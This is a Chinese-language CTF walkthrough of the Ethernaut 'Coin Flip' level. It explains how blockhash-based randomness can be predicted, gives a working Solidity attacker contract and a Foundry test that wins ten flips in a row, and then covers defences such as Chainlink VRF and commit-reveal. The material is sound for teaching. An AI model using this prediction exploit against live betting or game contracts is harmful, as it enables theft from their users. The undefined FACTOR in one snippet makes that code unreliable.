---
title: 'Ethernaut Level 3: Coin Flip - 伪随机数攻击详解'
date: 2025-01-25 14:40:00
updated: 2025-01-25 14:40:00
categories:
  - Ethernaut 系列
  - 基础攻击篇 (1-10)
tags:
  - Ethernaut
  - Foundry
  - 伪随机数
  - 可预测性攻击
  - 智能合约安全
  - Solidity
  - 区块链透明性
series: Ethernaut Foundry Solutions
excerpt: "深入理解区块链伪随机数的安全隐患，学习如何利用区块链的确定性特征预测随机数，掌握真正的随机数生成方案。"
---

# 🎯 Ethernaut Level 3: Coin Flip - 伪随机数攻击详解

> **关卡链接**: [Ethernaut Level 3 - Coin Flip](https://ethernaut.openzeppelin.com/level/3)  
> **攻击类型**: 伪随机数预测攻击  
> **难度**: ⭐⭐⭐☆☆  
> **核心概念**: 区块链确定性、可预测性

## 📋 挑战目标

这个关卡考验对区块链随机数机制的理解：

1. **连续猜对10次** - 连续正确预测硬币正反面
2. **理解伪随机数** - 掌握区块链"随机数"的本质
3. **学习预测技术** - 利用区块链的确定性进行攻击

## 🔍 漏洞分析

### 合约源码分析

```solidity
pragma solidity ^0.8.0;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    // 🚨 关键漏洞：使用可预测的区块哈希
    uint256 blockValue = uint256(blockhash(block.number - 1));
    
    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    // 🚨 伪随机数生成逻辑
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

### 漏洞识别

**伪随机数的根本缺陷**：

1. **数据源可预测** - `blockhash(block.number - 1)` 是公开可查的
2. **算法透明** - 随机数生成算法完全公开
3. **确定性计算** - 相同输入必然产生相同输出

**攻击原理**：

```solidity
// 合约使用的"随机数"生成
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;

// 攻击者可以在同一个区块内执行相同计算
// 由于使用相同的 blockhash，结果必然相同！
```

### 攻击流程

1. **获取当前区块哈希** - 读取 `blockhash(block.number - 1)`
2. **执行相同计算** - 使用相同的算法计算结果
3. **提前知道答案** - 在调用 `flip()` 前就知道正确答案
4. **提交正确猜测** - 保证100%胜率

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";

contract CoinFlipAttacker {
    CoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _target) {
        target = CoinFlip(_target);
    }
    
    function attack() public {
        // 🎯 关键：在同一区块内执行相同的计算
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        // 提交预先计算好的答案
        target.flip(side);
    }
}

contract CoinFlipTest is Test {
    CoinFlip public coinFlip;
    CoinFlipAttacker public attacker;
    
    address public attackerAddr = makeAddr("attacker");

    function setUp() public {
        // 部署目标合约
        coinFlip = new CoinFlip();
        
        // 部署攻击合约
        vm.prank(attackerAddr);
        attacker = new CoinFlipAttacker(address(coinFlip));
    }

    function testCoinFlipExploit() public {
        console.log("Initial consecutive wins:", coinFlip.consecutiveWins());
        
        vm.startPrank(attackerAddr);
        
        // 连续攻击10次以获得10连胜
        for (uint i = 0; i < 10; i++) {
            // 模拟新区块（每次攻击都在新区块进行）
            vm.roll(block.number + 1);
            
            uint256 winsBefore = coinFlip.consecutiveWins();
            attacker.attack();
            uint256 winsAfter = coinFlip.consecutiveWins();
            
            console.log("Round", i + 1, "- Wins:", winsAfter);
            
            // 验证每次攻击都成功
            assertEq(winsAfter, winsBefore + 1);
        }
        
        vm.stopPrank();
        
        // 验证最终达成10连胜
        assertEq(coinFlip.consecutiveWins(), 10);
        console.log("Attack successful! 10 consecutive wins achieved.");
    }
    
    function testPredictability() public view {
        // 演示随机数的可预测性
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        console.log("Block hash:", blockValue);
        console.log("Coin flip result:", side);
        console.log("This result is 100% predictable!");
    }
}
```

### 运行测试

```bash
# 运行 Coin Flip 攻击测试
forge test --match-contract CoinFlipTest -vvv

# 预期输出：
# [PASS] testCoinFlipExploit()
# Round 1 - Wins: 1
# Round 2 - Wins: 2
# ...
# Round 10 - Wins: 10
# Attack successful! 10 consecutive wins achieved.
```

## 🛡️ 防御措施

### 1. 使用 Chainlink VRF (推荐)

```solidity
import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol";

contract SecureCoinFlip is VRFConsumerBaseV2 {
    VRFCoordinatorV2Interface COORDINATOR;
    
    uint64 s_subscriptionId;
    bytes32 keyHash;
    uint32 callbackGasLimit = 100000;
    uint16 requestConfirmations = 3;
    uint32 numWords = 1;
    
    mapping(uint256 => address) public requestIdToSender;
    
    constructor(uint64 subscriptionId, address vrfCoordinator) 
        VRFConsumerBaseV2(vrfCoordinator) {
        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);
        s_subscriptionId = subscriptionId;
    }
    
    function flip(bool _guess) public {
        // 请求真正的随机数
        uint256 requestId = COORDINATOR.requestRandomWords(
            keyHash,
            s_subscriptionId,
            requestConfirmations,
            callbackGasLimit,
            numWords
        );
        
        requestIdToSender[requestId] = msg.sender;
        // 存储用户的猜测...
    }
    
    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) 
        internal override {
        // 使用真正的随机数处理结果
        bool side = (randomWords[0] % 2) == 1;
        address sender = requestIdToSender[requestId];
        
        // 处理游戏逻辑...
    }
}
```

### 2. 使用未来区块哈希 + 提交-揭示方案

```solidity
contract CommitRevealCoinFlip {
    struct Game {
        bytes32 commitment;
        uint256 revealBlock;
        bool revealed;
    }
    
    mapping(address => Game) public games;
    
    function commitFlip(bytes32 _commitment) public {
        games[msg.sender] = Game({
            commitment: _commitment,
            revealBlock: block.number + 10, // 10个区块后才能揭示
            revealed: false
        });
    }
    
    function revealFlip(bool _guess, uint256 _nonce) public {
        Game storage game = games[msg.sender];
        
        require(block.number >= game.revealBlock, "Too early to reveal");
        require(!game.revealed, "Already revealed");
        
        // 验证承诺
        bytes32 hash = keccak256(abi.encodePacked(_guess, _nonce, msg.sender));
        require(hash == game.commitment, "Invalid commitment");
        
        // 使用未来区块哈希
        uint256 futureBlockHash = uint256(blockhash(game.revealBlock));
        bool result = (futureBlockHash % 2) == 1;
        
        game.revealed = true;
        
        // 处理结果...
    }
}
```

### 3. 多源熵组合

```solidity
contract MultiSourceRandom {
    uint256 private nonce;
    
    function getRandomNumber() private returns (uint256) {
        // ⚠️ 仍不够安全，仅作教学示例
        nonce++;
        return uint256(keccak256(abi.encodePacked(
            block.difficulty,    // 矿工可操控
            block.timestamp,     // 矿工可小幅操控
            msg.sender,
            nonce,
            blockhash(block.number - 1)
        )));
    }
}
```

## 📚 核心知识点

### 1. 区块链随机数常见误区

| 数据源 | 安全性 | 操控难度 | 推荐使用 |
|--------|---------|----------|----------|
| `block.timestamp` | ❌ 极低 | 容易 | 否 |
| `block.difficulty` | ❌ 低 | 中等 | 否 |
| `blockhash` | ❌ 低 | 困难 | 否 |
| `keccak256(组合)` | ❌ 低 | 取决于组合 | 否 |
| **Chainlink VRF** | ✅ 高 | 极困难 | **是** |

### 2. 攻击者的优势

```solidity
// 攻击者可以：
// 1. 在同一交易中执行相同计算
// 2. 预先验证结果，只在有利时提交
// 3. 使用合约自动化攻击

contract SmartAttacker {
    function conditionalAttack(CoinFlip target, bool guess) public {
        // 预先计算
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool predictedSide = coinFlip == 1 ? true : false;
        
        // 只在预测正确时才攻击
        if (predictedSide == guess) {
            target.flip(guess);
        }
        // 否则什么都不做，等待下一个有利机会
    }
}
```

### 3. 真随机数 vs 伪随机数

```solidity
// ❌ 伪随机数（确定性）
function badRandom() public view returns (uint256) {
    return uint256(keccak256(abi.encodePacked(
        block.timestamp,
        block.difficulty,
        msg.sender
    )));
}

// ✅ 真随机数（使用预言机）
function goodRandom() public {
    // 通过 Chainlink VRF 请求真正的随机数
    requestRandomness(keyHash, fee);
}
```

## 🏛️ 历史案例

### 著名的随机数攻击事件

1. **SmartBillions** (2017)
   - 损失: 400 ETH
   - 原因: 使用 `block.blockhash` 作为随机源
   - 攻击: 预测未来区块哈希

2. **Fomo3D** (2018)
   - 影响: 游戏机制被操控
   - 原因: 使用可预测的时间戳
   - 后果: 奖池分配不公

3. **TheRun** (2019)
   - 损失: 大量代币
   - 原因: 复杂但仍可预测的随机数算法

## 🎯 总结

Coin Flip 关卡揭示了区块链随机数的根本问题：

- ✅ **区块链是确定性系统** - 相同输入必然产生相同输出
- ✅ **透明性带来可预测性** - 所有数据都是公开的
- ✅ **真随机数需要外部熵源** - 必须依赖链下随机性
- ✅ **预言机是最佳解决方案** - Chainlink VRF 等服务

这个看似简单的猜硬币游戏，实际上涉及密码学、概率论和分布式系统的深层概念。理解其原理对于构建安全的智能合约至关重要。

---

## 🔗 相关链接

- **[上一关: Level 2 - Fallout](/2025/01/25/ethernaut-level-02-fallout/)**
- **[下一关: Level 4 - Telephone](/2025/01/25/ethernaut-level-04-telephone/)**
- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**
- **[Chainlink VRF 文档](https://docs.chain.link/vrf/v2/introduction)**
- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**

---

*在区块链的确定性世界中，真正的随机性是一种珍贵的资源。* 🎲